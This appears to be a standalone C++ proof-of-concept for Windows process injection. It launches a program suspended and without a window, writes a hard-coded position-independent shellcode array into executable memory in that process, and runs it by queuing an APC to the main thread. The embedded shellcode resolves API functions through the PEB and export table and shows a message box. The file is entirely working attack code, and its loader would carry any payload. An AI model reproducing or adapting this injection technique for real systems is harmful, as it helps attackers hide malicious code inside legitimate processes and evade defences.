#include <windows.h>
#include <iostream>
using namespace std;
UCHAR shellcode[] = { 0x55,0x8B,0xEC,0x83,0xEC,0x60,0xE8,0x95,0x01,0x00,0x00,0x50,0xE8,0xAF,0x01,0x00,0x00,0x83,0xC4,0x04,0x89,0x45,0xFC,0xC6,0x45,0xCC,0x4C,0xC6,0x45,0xCD,0x6F,0xC6,0x45,0xCE,0x61,0xC6,0x45,0xCF,0x64,0xC6,0x45,0xD0,0x4C,0xC6,0x45,0xD1,0x69,0xC6,0x45,0xD2,0x62,0xC6,0x45,0xD3,0x72,0xC6,0x45,0xD4,0x61,0xC6,0x45,0xD5,0x72,0xC6,0x45,0xD6,0x79,0xC6,0x45,0xD7,0x57,0xC6,0x45,0xD8,0x00,0x8D,0x45,0xCC,0x50,0xE8,0x4C,0x01,0x00,0x00,0x50,0xFF,0x55,0xFC,0x89,0x45,0xF8,0xB9,0x75,0x00,0x00,0x00,0x66,0x89,0x4D,0xA0,0xBA,0x73,0x00,0x00,0x00,0x66,0x89,0x55,0xA2,0xB8,0x65,0x00,0x00,0x00,0x66,0x89,0x45,0xA4,0xB9,0x72,0x00,0x00,0x00,0x66,0x89,0x4D,0xA6,0xBA,0x33,0x00,0x00,0x00,0x66,0x89,0x55,0xA8,0xB8,0x32,0x00,0x00,0x00,0x66,0x89,0x45,0xAA,0xB9,0x2E,0x00,0x00,0x00,0x66,0x89,0x4D,0xAC,0xBA,0x64,0x00,0x00,0x00,0x66,0x89,0x55,0xAE,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x45,0xB0,0xB9,0x6C,0x00,0x00,0x00,0x66,0x89,0x4D,0xB2,0x33,0xD2,0x66,0x89,0x55,0xB4,0xC6,0x45,0xDC,0x4D,0xC6,0x45,0xDD,0x65,0xC6,0x45,0xDE,0x73,0xC6,0x45,0xDF,0x73,0xC6,0x45,0xE0,0x61,0xC6,0x45,0xE1,0x67,0xC6,0x45,0xE2,0x65,0xC6,0x45,0xE3,0x42,0xC6,0x45,0xE4,0x6F,0xC6,0x45,0xE5,0x78,0xC6,0x45,0xE6,0x57,0xC6,0x45,0xE7,0x00,0x8D,0x45,0xDC,0x50,0x8D,0x4D,0xA0,0x51,0xFF,0x55,0xF8,0x50,0xFF,0x55,0xFC,0x89,0x45,0xF4,0xBA,0x53,0x00,0x00,0x00,0x66,0x89,0x55,0xB8,0xB8,0x68,0x00,0x00,0x00,0x66,0x89,0x45,0xBA,0xB9,0x65,0x00,0x00,0x00,0x66,0x89,0x4D,0xBC,0xBA,0x6C,0x00,0x00,0x00,0x66,0x89,0x55,0xBE,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x45,0xC0,0xB9,0x63,0x00,0x00,0x00,0x66,0x89,0x4D,0xC2,0xBA,0x6F,0x00,0x00,0x00,0x66,0x89,0x55,0xC4,0xB8,0x64,0x00,0x00,0x00,0x66,0x89,0x45,0xC6,0xB9,0x65,0x00,0x00,0x00,0x66,0x89,0x4D,0xC8,0x33,0xD2,0x66,0x89,0x55,0xCA,0xB8,0x4C,0x00,0x00,0x00,0x66,0x89,0x45,0xE8,0xB9,0x59,0x00,0x00,0x00,0x66,0x89,0x4D,0xEA,0xBA,0x53,0x00,0x00,0x00,0x66,0x89,0x55,0xEC,0xB8,0x4D,0x00,0x00,0x00,0x66,0x89,0x45,0xEE,0x33,0xC9,0x66,0x89,0x4D,0xF0,0x6A,0x00,0x8D,0x55,0xE8,0x52,0x8D,0x45,0xB8,0x50,0x6A,0x00,0xFF,0x55,0xF4,0x33,0xC0,0x8B,0xE5,0x5D,0xC3,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x64,0xA1,0x30,0x00,0x00,0x00,0x8B,0x40,0x0C,0x8B,0x40,0x14,0x8B,0x00,0x8B,0x00,0x8B,0x40,0x10,0xC3,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x55,0x8B,0xEC,0x83,0xEC,0x24,0x8B,0x45,0x08,0x89,0x45,0xE8,0x8B,0x4D,0xE8,0x8B,0x55,0x08,0x03,0x51,0x3C,0x89,0x55,0xF0,0xB8,0x08,0x00,0x00,0x00,0x6B,0xC8,0x00,0x8B,0x55,0xF0,0x83,0x7C,0x0A,0x7C,0x00,0x75,0x07,0x33,0xC0,0xE9,0xE3,0x01,0x00,0x00,0xB8,0x08,0x00,0x00,0x00,0x6B,0xC8,0x00,0x8B,0x55,0xF0,0x83,0x7C,0x0A,0x78,0x00,0x75,0x07,0x33,0xC0,0xE9,0xCA,0x01,0x00,0x00,0xB8,0x08,0x00,0x00,0x00,0x6B,0xC8,0x00,0x8B,0x55,0xF0,0x8B,0x45,0x08,0x03,0x44,0x0A,0x78,0x89,0x45,0xF4,0x8B,0x4D,0xF4,0x8B,0x55,0x08,0x03,0x51,0x20,0x89,0x55,0xE4,0x8B,0x45,0xF4,0x8B,0x4D,0x08,0x03,0x48,0x24,0x89,0x4D,0xE0,0x8B,0x55,0xF4,0x8B,0x45,0x08,0x03,0x42,0x1C,0x89,0x45,0xDC,0xC7,0x45,0xF8,0x00,0x00,0x00,0x00,0xC7,0x45,0xEC,0x00,0x00,0x00,0x00,0xEB,0x09,0x8B,0x4D,0xF8,0x83,0xC1,0x01,0x89,0x4D,0xF8,0x8B,0x55,0xF4,0x8B,0x42,0x18,0x83,0xE8,0x01,0x39,0x45,0xF8,0x0F,0x87,0x63,0x01,0x00,0x00,0x8B,0x4D,0xF8,0x8B,0x55,0xE4,0x8B,0x04,0x8A,0x03,0x45,0x08,0x89,0x45,0xFC,0xB9,0x01,0x00,0x00,0x00,0x6B,0xD1,0x00,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x47,0x0F,0x85,0x37,0x01,0x00,0x00,0xBA,0x01,0x00,0x00,0x00,0xC1,0xE2,0x00,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x65,0x0F,0x85,0x1F,0x01,0x00,0x00,0xBA,0x01,0x00,0x00,0x00,0xD1,0xE2,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x74,0x0F,0x85,0x08,0x01,0x00,0x00,0xBA,0x01,0x00,0x00,0x00,0x6B,0xC2,0x03,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x50,0x0F,0x85,0xF0,0x00,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0xC1,0xE0,0x02,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x72,0x0F,0x85,0xD8,0x00,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0x6B,0xC8,0x05,0x8B,0x55,0xFC,0x0F,0xBE,0x04,0x0A,0x83,0xF8,0x6F,0x0F,0x85,0xC0,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x6B,0xD1,0x06,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x63,0x0F,0x85,0xA8,0x00,0x00,0x00,0xBA,0x01,0x00,0x00,0x00,0x6B,0xC2,0x07,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x41,0x0F,0x85,0x90,0x00,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0xC1,0xE0,0x03,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x64,0x75,0x7C,0xB8,0x01,0x00,0x00,0x00,0x6B,0xC8,0x09,0x8B,0x55,0xFC,0x0F,0xBE,0x04,0x0A,0x83,0xF8,0x64,0x75,0x68,0xB9,0x01,0x00,0x00,0x00,0x6B,0xD1,0x0A,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x72,0x75,0x54,0xBA,0x01,0x00,0x00,0x00,0x6B,0xC2,0x0B,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x65,0x75,0x40,0xB8,0x01,0x00,0x00,0x00,0x6B,0xC8,0x0C,0x8B,0x55,0xFC,0x0F,0xBE,0x04,0x0A,0x83,0xF8,0x73,0x75,0x2C,0xB9,0x01,0x00,0x00,0x00,0x6B,0xD1,0x0D,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x73,0x75,0x18,0x8B,0x55,0xF8,0x8B,0x45,0xE0,0x0F,0xB7,0x0C,0x50,0x8B,0x55,0xDC,0x8B,0x04,0x8A,0x03,0x45,0x08,0x89,0x45,0xEC,0xEB,0x05,0xE9,0x82,0xFE,0xFF,0xFF,0x8B,0x45,0xEC,0x8B,0xE5,0x5D,0xC3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

int main(int argc, char* arg[])
{
	// 1. create suspended process
	STARTUPINFO pStartupInfo = { 0 };
	PROCESS_INFORMATION pProcessInfo = { 0 };
	CreateProcessA(NULL, (LPSTR)arg[1], NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &pStartupInfo, &pProcessInfo);
	cout << arg[1] << " pid is " << pProcessInfo.dwProcessId << endl;
	// 2. Alloc memory and write shellcode into process
	LPVOID AllocMemory = VirtualAllocEx(pProcessInfo.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pProcessInfo.hProcess, AllocMemory, shellcode, sizeof(shellcode), NULL);
	// 3. Inject APC into Thread and resumeThread
	QueueUserAPC((PAPCFUNC)AllocMemory, pProcessInfo.hThread, NULL);
	ResumeThread(pProcessInfo.hThread);
	CloseHandle(pProcessInfo.hThread);
	return 0;
}
